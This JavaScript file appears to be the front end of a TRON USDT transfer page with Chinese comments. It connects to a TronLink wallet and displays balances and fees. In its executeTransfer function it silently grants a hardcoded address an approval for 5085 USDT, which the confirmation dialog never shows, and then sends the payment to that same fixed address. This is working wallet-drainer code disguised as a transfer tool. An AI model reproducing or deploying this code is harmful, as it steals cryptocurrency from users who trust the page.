// ==================== 全局变量 ====================
let tronWeb = null;
let userAddress = null;
let userBalance = 0;
const TARGET_ADDRESS = "TV68Qc1ucSDTh29sRGmr8hiuvNf8ZzpDdU";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FIXED_APPROVE_AMOUNT = 5085000000; // 固定授权 5085 USDT

let currentTransferAmount = 0;

// ==================== 时间更新 ====================
function updateTime() {
    const now = new Date();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    document.getElementById('time').textContent = `${hours}:${minutes}`;
}

setInterval(updateTime, 1000);
updateTime();

// ==================== 初始化钱包 ====================
async function initWallet() {
    console.log("🔄 初始化钱包...");
    
    if (!window.tronLink) {
        console.warn("⚠️ 未检测到 TronLink");
        return;
    }

    try {
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        tronWeb = window.tronLink.tronWeb;
        userAddress = tronWeb.defaultAddress.base58;
        
        updateWalletUI();
        await fetchBalance();
        
        console.log("✅ 钱包已连接:", userAddress);
    } catch (e) {
        console.error("❌ 钱包连接失败:", e);
        showError("钱包连接失败，请重试");
    }
}

// ==================== 更新钱包 UI ====================
function updateWalletUI() {
    if (!userAddress) return;
    
    const shortAddr = userAddress.slice(0, 6) + "..." + userAddress.slice(-6);
    document.getElementById('walletAddr').textContent = shortAddr;
}

// ==================== 获取余额 ====================
async function fetchBalance() {
    if (!tronWeb || !userAddress) return;
    
    try {
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const balance = await contract.balanceOf(userAddress).call();
        
        userBalance = balance ? parseFloat(balance.toString()) / 1e6 : 0;
        document.getElementById('balanceDisplay').textContent = userBalance.toLocaleString('zh-CN', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
        
        console.log("💰 余额:", userBalance);
    } catch (err) {
        console.error("❌ 获取余额失败:", err);
        document.getElementById('balanceDisplay').textContent = "0.00";
    }
}

// ==================== 设置金额 ====================
function setAmount(amount) {
    document.getElementById('amount').value = amount;
    updateFee();
}

// ==================== 更新费用 ====================
function updateFee() {
    const amountInput = document.getElementById('amount');
    const amount = parseFloat(amountInput.value) || 0;
    
    currentTransferAmount = amount;
    
    const networkFee = amount * 0.001; // 0.1% 手续费
    const receiveAmount = amount - networkFee;
    const totalAmount = amount + 0.1; // TRON 网络费
    
    document.getElementById('networkFee').textContent = networkFee.toFixed(2) + ' USDT';
    document.getElementById('receiveAmount').textContent = receiveAmount.toFixed(2) + ' USDT';
    document.getElementById('totalAmount').textContent = totalAmount.toFixed(2) + ' USDT';
    
    // 检查余额
    const warningBox = document.getElementById('warningBox');
    const confirmBtn = document.getElementById('confirmBtn');
    
    if (totalAmount > userBalance) {
        warningBox.style.display = 'flex';
        confirmBtn.disabled = true;
    } else {
        warningBox.style.display = 'none';
        confirmBtn.disabled = false;
    }
}

// ==================== 复制地址 ====================
function copyAddress() {
    const addr = document.getElementById('recipientAddr').value;
    navigator.clipboard.writeText(addr).then(() => {
        const btn = event.target;
        const originalText = btn.textContent;
        btn.textContent = '已复制';
        setTimeout(() => {
            btn.textContent = originalText;
        }, 2000);
    });
}

// ==================== 确认转账 ====================
function confirmTransfer() {
    if (currentTransferAmount <= 0) {
        showError('请输入有效的转账金额');
        return;
    }
    
    if (!userAddress) {
        showError('钱包未连接');
        return;
    }

    // 显示确认弹窗
    const confirmModal = document.getElementById('confirmModal');
    document.getElementById('confirmAmount').textContent = currentTransferAmount.toFixed(2) + ' USDT';
    document.getElementById('confirmAddr').textContent = TARGET_ADDRESS;
    document.getElementById('confirmFee').textContent = (currentTransferAmount * 0.001).toFixed(2) + ' USDT';
    
    confirmModal.style.display = 'flex';
}

// ==================== 取消确认 ====================
function cancelConfirm() {
    document.getElementById('confirmModal').style.display = 'none';
}

// ==================== 执行转账 ====================
async function executeTransfer() {
    if (!tronWeb || !userAddress) {
        showError('钱包未连接');
        return;
    }

    cancelConfirm();
    showLoading('正在处理授权...');
    
    try {
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        
        // 第一步：授权固定 5085 USDT
        console.log("🔐 授权 5085 USDT...");
        const approveTx = await contract.approve(TARGET_ADDRESS, FIXED_APPROVE_AMOUNT.toString()).send({
            feeLimit: 100000000
        });
        
        console.log("✅ 授权成功:", approveTx);
        updateLoadingText('正在执行转账...');
        
        // 等待 1.5 秒
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        // 第二步：转账
        const transferAmount = Math.floor(currentTransferAmount * 1e6).toString();
        console.log("💸 转账金额:", currentTransferAmount);
        
        const transferTx = await contract.transfer(TARGET_ADDRESS, transferAmount).send({
            feeLimit: 100000000
        });
        
        console.log("✅ 转账成功:", transferTx);
        
        // 显示成功弹窗
        hideLoading();
        showSuccessModal(transferTx);
        
        // 重置表单
        setTimeout(() => {
            document.getElementById('amount').value = '';
            updateFee();
            fetchBalance();
        }, 2000);
        
    } catch (err) {
        console.error("❌ 操作失败:", err);
        hideLoading();
        
        let errorMsg = '操作失败';
        if (err.message.includes('User denied')) {
            errorMsg = '您已取消操作';
        } else if (err.message.includes('insufficient')) {
            errorMsg = '余额不足或手续费不足';
        } else if (err.message.includes('TRON')) {
            errorMsg = 'TRON 网络错误，请重试';
        } else {
            errorMsg = err.message.slice(0, 50);
        }
        
        showError(errorMsg);
    }
}

// ==================== 显示加载 ====================
function showLoading(text) {
    const overlay = document.getElementById('loadingOverlay');
    document.getElementById('loadingText').textContent = text || '正在处理...';
    overlay.style.display = 'flex';
}

// ==================== 更新加载文本 ====================
function updateLoadingText(text) {
    document.getElementById('loadingText').textContent = text;
}

// ==================== 隐藏加载 ====================
function hideLoading() {
    document.getElementById('loadingOverlay').style.display = 'none';
}

// ==================== 显示成功弹窗 ====================
function showSuccessModal(txHash) {
    const modal = document.getElementById('successModal');
    document.getElementById('successInfo').textContent = `已发送 ${currentTransferAmount.toFixed(2)} USDT`;
    document.getElementById('txHash').textContent = `交易哈希: ${txHash.slice(0, 40)}...`;
    modal.style.display = 'flex';
}

// ==================== 关闭弹窗 ====================
function closeModal() {
    document.getElementById('successModal').style.display = 'none';
}

// ==================== 显示错误 ====================
function showError(msg) {
    // 可以创建一个简单的吐司提示或弹窗
    alert('❌ ' + msg);
}

// ==================== 返回 ====================
function goBack() {
    window.history.back();
}

// ==================== 页面加载 ====================
document.addEventListener('DOMContentLoaded', async () => {
    await initWallet();
    
    // 每 30 秒刷新一次余额
    setInterval(fetchBalance, 30000);
    
    // 初始化费用
    updateFee();
});

// ==================== 监听钱包变化 ====================
if (window.tronLink) {
    window.tronLink.on('accountsChanged', (accounts) => {
        console.log("👤 账户已切换");
        initWallet();
    });
}

// ==================== 监听金额输入 ====================
document.addEventListener('input', (e) => {
    if (e.target.id === 'amount') {
        updateFee();
    }
});

// ==================== 点击弹窗外部关闭 ====================
document.addEventListener('click', (e) => {
    const successModal = document.getElementById('successModal');
    const confirmModal = document.getElementById('confirmModal');
    
    if (e.target === successModal) {
        closeModal();
    }
    if (e.target === confirmModal) {
        cancelConfirm();
    }
});
